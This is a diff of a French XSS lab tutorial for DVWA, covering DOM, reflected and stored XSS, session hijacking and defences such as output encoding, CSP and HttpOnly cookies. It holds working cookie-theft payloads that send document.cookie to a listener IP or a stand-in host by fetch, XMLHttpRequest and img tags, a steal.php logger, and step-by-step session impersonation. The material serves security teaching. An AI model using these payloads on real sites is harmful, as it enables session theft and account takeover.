 ```
 listening on [any] 8000 ...
 connect to [192.168.1.48] from (UNKNOWN) [192.168.1.100] 54321
-GET /PHPSESSID=abc123def456ghi789jkl012mno345; security=low HTTP/1.1
+GET /PHPSESSID=abc123def456...; security=low HTTP/1.1
 Host: 192.168.1.48:8000
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
-Accept: */*
-Referer: http://servertcm:8001/vulnerabilities/xss_s/
 ```
 
-**Cookie extrait** :
+🎯 **Succès !** Vous avez volé le cookie !
+
+---
+
+### 6.5 Exercice 13 : Utiliser le cookie volé (Impersonation)
+
+**Étape 1 : Ouvrir un navigateur en mode privé**
 
 ```
-PHPSESSID=abc123def456ghi789jkl012mno345
-security=low
+Ctrl + Shift + N (Chrome) ou Ctrl + Shift + P (Firefox)
 ```
 
-**Succès** : Cookie de session volé ! 🎯
+Accédez à DVWA : `http://servertcm:8001`
 
-### 5.7 Session Hijacking - Impersonation
+→ Vous verrez la page de login (pas connecté).
 
-**Ouvrir navigateur privé** :
+---
 
-```
-1. Nouvelle fenêtre privée (Ctrl+Shift+N)
-2. Accéder à DVWA : http://servertcm:8001
-```
+**Étape 2 : Injecter le cookie volé**
 
-**Observation** : Page de login affichée (pas connecté).
+1. F12 → Application → Cookies
+2. Cliquez sur le domaine `http://servertcm:8001`
+3. Cliquez sur "Ajouter" ou le bouton "+"
+4. Remplissez :
+   - **Name** : `PHPSESSID`
+   - **Value** : `abc123def456...` (le cookie volé)
+   - **Domain** : `servertcm`
+   - **Path** : `/`
+5. Sauvegardez
 
-**Injection du cookie volé**  : [qiita](https://qiita.com/nozomi2025/items/9cb849ee10e0fb88c515)
+---
 
-```
-1. F12 → Application → Cookies → http://servertcm:8001
-2. Ajouter nouveau cookie :
-   - Name: PHPSESSID
-   - Value: abc123def456ghi789jkl012mno345
-   - Domain: servertcm
-   - Path: /
-   - HttpOnly: ☐ (décoché)
-   - Secure: ☐ (décoché)
-3. Sauvegarder
-```
+**Étape 3 : Rafraîchir la page**
 
-**Accès à DVWA** :
+Supprimez `/login.php` de l'URL et appuyez sur Entrée.
 
 ```
-1. Supprimer "/login.php" de l'URL
-2. URL : http://servertcm:8001/
-3. Rafraîchir la page
+http://servertcm:8001/
 ```
+
+Rafraîchissez (F5).
+
+---
 
 **Résultat** :
 
@@ -644,106 +733,96 @@ security=low
 └─────────────────────────────────────┘
 ```
 
-**✅ Succès** : Connecté en tant qu'admin **sans mot de passe** ! [invicti](https://www.invicti.com/learn/cookie-hijacking)
+🎉 **Succès !** Vous êtes connecté en tant qu'admin **sans mot de passe** !
 
-### 5.8 Variantes du payload
+---
 
-**Alternative 1 : Image invisible**  : [middlebrick](https://middlebrick.com/security/auth/session-cookies/xss-cross-site-scripting)
+## Partie 7 : Protections contre XSS
 
-```html
-<img src="http://192.168.1.48:8000/steal.php?cookie=" + document.cookie style="display:none">
-```
+### 7.1 Protection 1 : Encodage de sortie (Output Encoding)
 
-**Alternative 2 : XMLHttpRequest** :
+🛡️ **Principe** : Convertir les caractères spéciaux en leur version HTML sécurisée.
 
-```html
-<script>
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://192.168.1.48:8000/" + document.cookie, true);
-xhr.send();
-</script>
-```
+| Caractère | Version encodée |
+|-----------|-----------------|
+| `<` | `&lt;` |
+| `>` | `&gt;` |
+| `"` | `&quot;` |
+| `'` | `&#39;` |
+| `&` | `&amp;` |
 
-**Alternative 3 : Serveur PHP pour logging** :
+---
 
-**Fichier `steal.php` sur attaquant** :
+**Exemple en PHP** :
 
 ```php
 <?php
-$cookie = $_GET['cookie'];
-$log = fopen("cookies.txt", "a");
-fwrite($log, $cookie . "\n");
-fclose($log);
-?>
-```
-
-**Payload** :
-
-```html
-<script>fetch('http://192.168.1.48:8000/steal.php?cookie='+document.cookie);</script>
-```
-
-***
-
-## Partie 6 : Protections contre XSS
-
-### 6.1 Encodage de sortie (Output Encoding) [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
-
-**Principe** : Encoder les caractères spéciaux avant de les afficher.
-
-**PHP** :
-
-```php
-<?php
-// Mauvais
+// ❌ Mauvais : Vulnérable à XSS
 echo $_GET['name'];
 
-// Bon : htmlspecialchars()
+// ✅ Bon : Protégé avec htmlspecialchars()
 echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
-
-// <script> devient &lt;script&gt; (affiché comme texte, pas exécuté)
 ?>
 ```
 
-**JavaScript** :
+🔑 **Résultat** :
+- Input : `<script>alert('XSS')</script>`
+- Output : `&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;`
+- Affichage : `<script>alert('XSS')</script>` (texte, pas exécuté)
+
+---
+
+**Exemple en JavaScript** :
 
 ```javascript
-// Mauvais
+// ❌ Mauvais : Vulnérable à XSS
 document.getElementById('output').innerHTML = userInput;
 
-// Bon : textContent (pas d'interprétation HTML)
+// ✅ Bon : Protégé avec textContent
 document.getElementById('output').textContent = userInput;
 ```
 
-### 6.2 Content Security Policy (CSP) [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
+---
 
-**Header HTTP** :
+### 7.2 Protection 2 : Content Security Policy (CSP)
+
+🛡️ **Principe** : Dire au navigateur quelles sources de scripts sont autorisées.
+
+---
+
+**Exemple de header CSP** :
 
 ```
 Content-Security-Policy: default-src 'self'; script-src 'self'
 ```
 
+🔑 **Signification** :
+- `default-src 'self'` : Par défaut, tout doit venir du même domaine
+- `script-src 'self'` : Les scripts doivent venir du même domaine uniquement
+
+---
+
 **Effet** :
-- ✅ Scripts autorisés seulement depuis le même domaine
-- ❌ Scripts inline `<script>alert('XSS')</script>` bloqués
-- ❌ `eval()` bloqué
-- ❌ Event handlers inline (`onerror="..."`) bloqués
+- ✅ Scripts externes bloqués
+- ✅ Scripts inline (`<script>alert('XSS')</script>`) bloqués
+- ✅ `eval()` bloqué
+- ✅ Event handlers inline (`onerror="..."`) bloqués
 
-**Configuration Apache** :
+---
 
-```apache
-Header set Content-Security-Policy "default-src 'self'; script-src 'self'"
-```
+### 7.3 Protection 3 : HttpOnly Cookie
 
-### 6.3 HttpOnly Cookie Flag [invicti](https://www.invicti.com/learn/cookie-hijacking)
+🛡️ **Principe** : Empêcher JavaScript d'accéder au cookie.
 
-**PHP** :
+---
+
+**Configuration en PHP** :
 
 ```php
 <?php
 session_start();
 
-// Configurer cookie HttpOnly
+// Configurer le cookie avec HttpOnly
 session_set_cookie_params([
     'httponly' => true,  // ← Bloque document.cookie
     'secure' => true,    // HTTPS uniquement
@@ -752,57 +831,146 @@ session_set_cookie_params([
 ?>
 ```
 
-**Effet** : `document.cookie` retourne vide → XSS ne peut pas voler le cookie. [middlebrick](https://middlebrick.com/security/auth/session-cookies/xss-cross-site-scripting)
+---
 
-### 6.4 Validation et sanitization côté serveur
+**Effet** :
 
-**Whitelist** :
+```javascript
+document.cookie
+// Résultat : "" (vide)
+```
+
+🔑 **Résultat** : Même avec XSS, l'attaquant ne peut pas voler le cookie !
+
+---
+
+### 7.4 Protection 4 : Validation côté serveur
+
+🛡️ **Principe** : Vérifier que l'input correspond à ce qui est attendu.
+
+---
+
+**Exemple : Whitelist** (autoriser seulement certains caractères)
 
 ```php
 <?php
-// Autoriser seulement alphanumerique
-if (!preg_match('/^[a-zA-Z0-9]+$/', $input)) {
-    die("Invalid input");
+// ❌ Mauvais : Accepte tout
+$name = $_GET['name'];
+
+// ✅ Bon : Accepte seulement lettres et chiffres
+if (!preg_match('/^[a-zA-Z0-9]+$/', $_GET['name'])) {
+    die("Nom invalide : seulement lettres et chiffres autorisés");
 }
+$name = $_GET['name'];
 ?>
 ```
 
-**Bibliothèque HTML Purifier** :
+---
 
-```php
-<?php
-require_once 'HTMLPurifier.auto.php';
-$config = HTMLPurifier_Config::createDefault();
-$purifier = new HTMLPurifier($config);
+### 7.5 Résumé des protections
 
-$clean_html = $purifier->purify($dirty_html);
-?>
+| Protection | Contre quoi | Efficacité |
+|------------|-------------|------------|
+| **Output Encoding** | Injection de scripts | 🔴 Essentielle |
+| **CSP** | Exécution de scripts non autorisés | 🟡 Forte |
+| **HttpOnly Cookie** | Vol de cookies via XSS | 🟡 Forte |
+| **Validation serveur** | Input malveillant | 🟡 Forte |
+| **Filtrage simple** | Tentatives basiques | 🔴 Faible (bypassable) |
+
+---
+
+## Partie 8 : Exercices Pratiques
+
+### Exercice 1 : XSS DOM
+
+🎯 **Objectif** : Faire apparaître une alerte avec votre prénom.
+
+```
+Payload : '></option></select><script>alert('VotrePrénom')</script>
 ```
 
-### 6.5 X-XSS-Protection Header
+---
+
+### Exercice 2 : XSS Reflected
+
+🎯 **Objectif** : Créer une URL qui redirige vers un site de votre choix.
 
 ```
-X-XSS-Protection: 1; mode=block
+Payload : <script>document.location.href='https://example.com'</script>
 ```
 
-**Effet** : Active le filtre XSS intégré du navigateur (obsolète dans navigateurs modernes, remplacé par CSP).
+---
 
-***
+### Exercice 3 : XSS Stored
 
-## Résumé : Points clés à retenir
+🎯 **Objectif** : Injecter un message persistant qui affiche une alerte personnalisée.
 
-1. **XSS** : Injection de JavaScript malveillant exécuté dans navigateur victime [en.wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
-2. **DOM-based XSS** : Manipulation DOM côté client, payload ne passe pas par serveur [linkedin](https://www.linkedin.com/pulse/xss-depth-from-reflected-dom-based-how-defend-against-elgabroun-dbh1f)
-3. **Reflected XSS** : Payload dans URL, renvoyé immédiatement par serveur [trendmicro](https://www.trendmicro.com/en_us/research/23/e/cross-site-scripting-xss-attacks.html)
-4. **Stored XSS** : Payload stocké en DB, exécuté pour tous les visiteurs (le plus dangereux) [owasp](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
-5. **DOM Low** : `'></option></select><script>alert('XSS')</script>` [youtube](https://www.youtube.com/watch?v=JZk2qk-BB6o)
-6. **DOM Medium** : `"></option></select><img src=x onerror="alert('XSS')">` [gayunkim-1.tistory](https://gayunkim-1.tistory.com/28)
-7. **img onerror** : Bypass filtre `<script>` avec event handler [linkedin](https://www.linkedin.com/posts/suresh-aydi_you-can-use-image-onerroralert-src-activity-7383774604265291776-baWe)
-8. **Stored maxlength** : Modifier attribut HTML via DevTools pour bypasser limitation
-9. **Session Hijacking** : Vol de cookie PHPSESSID via `document.cookie` [qiita](https://qiita.com/nozomi2025/items/9cb849ee10e0fb88c515)
-10. **fetch() payload** : `fetch('http://IP:8000/'+document.cookie)` [middlebrick](https://middlebrick.com/security/auth/session-cookies/xss-cross-site-scripting)
-11. **HttpOnly = Non** : Cookie accessible via JavaScript → Vulnérable [invicti](https://www.invicti.com/learn/cookie-hijacking)
-12. **Impersonation** : Injecter cookie volé dans navigateur privé → Connexion sans password [qiita](https://qiita.com/nozomi2025/items/9cb849ee10e0fb88c515)
-13. **Protection** : htmlspecialchars(), CSP, HttpOnly cookie, validation [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
-14. **CSP** : `script-src 'self'` bloque scripts inline [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
-15. **Output Encoding** : Convertir `<` en `&lt;` avant affichage [en.wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
+```
+Payload : <script>alert('Message persistant !')</script>
+```
+
+---
+
+### Exercice 4 : Vol de cookie (Simulation)
+
+🎯 **Objectif** : Créer un payload qui envoie le cookie vers un serveur fictif.
+
+```
+Payload : <script>fetch('http://serveur-fictif.com/steal?c='+document.cookie);</script>
+```
+
+⚠️ **Note** : Ne testez pas ceci sur un vrai serveur sans autorisation !
+
+---
+
+## Partie 9 : Résumé et Points Clés
+
+### 🎓 Ce que vous avez appris
+
+| Concept | Points clés |
+|---------|-------------|
+| **XSS** | Injection de JavaScript dans une page web |
+| **3 types** | DOM-based, Reflected, Stored |
+| **DOM XSS** | Manipulation du DOM côté client |
+| **Reflected XSS** | Payload dans l'URL, renvoyé par serveur |
+| **Stored XSS** | Payload stocké en DB (plus dangereux) |
+| **Session Hijacking** | Vol de cookie de session |
+| **Protections** | Output encoding, CSP, HttpOnly, validation |
+
+---
+
+### 🔑 Points essentiels à retenir
+
+1. **XSS permet l'exécution de JavaScript dans le navigateur de la victime**
+2. **Stored XSS est le plus dangereux car il affecte tous les visiteurs**
+3. **Les filtres simples sont souvent contournables**
+4. **Le vol de cookie permet de se connecter sans mot de passe**
+5. **HttpOnly empêche le vol de cookie via JavaScript**
+6. **Output encoding est la protection la plus importante**
+7. **Les limitations côté client (HTML) ne sont pas des sécurités**
+8. **Toujours tester les filtres avec plusieurs payloads**
+
+---
+
+### 🚀 Pour aller plus loin
+
+- **OWASP XSS Prevention Cheat Sheet** : Guide complet de protection
+- **PortSwigger Web Security Academy** : Laboratoires interactifs gratuits
+- **DVWA** : Entraînez-vous sur différents niveaux de sécurité
+
+---
+
+## 📝 Glossaire
+
+| Terme | Définition |
+|-------|------------|
+| **XSS** | Cross-Site Scripting : Injection de scripts malveillants |
+| **DOM** | Document Object Model : Représentation de la page web |
+| **Payload** | Code malveillant injecté |
+| **Session** | Connexion temporaire entre client et serveur |
+| **Cookie** | Petit fichier stocké par le navigateur |
+| **Session Hijacking** | Vol de session pour usurper une identité |
+| **HttpOnly** | Flag de sécurité pour les cookies |
+| **CSP** | Content Security Policy : Politique de sécurité |
+| **Output Encoding** | Encodage des données avant affichage |
+| **Whitelist** | Liste de valeurs autorisées |
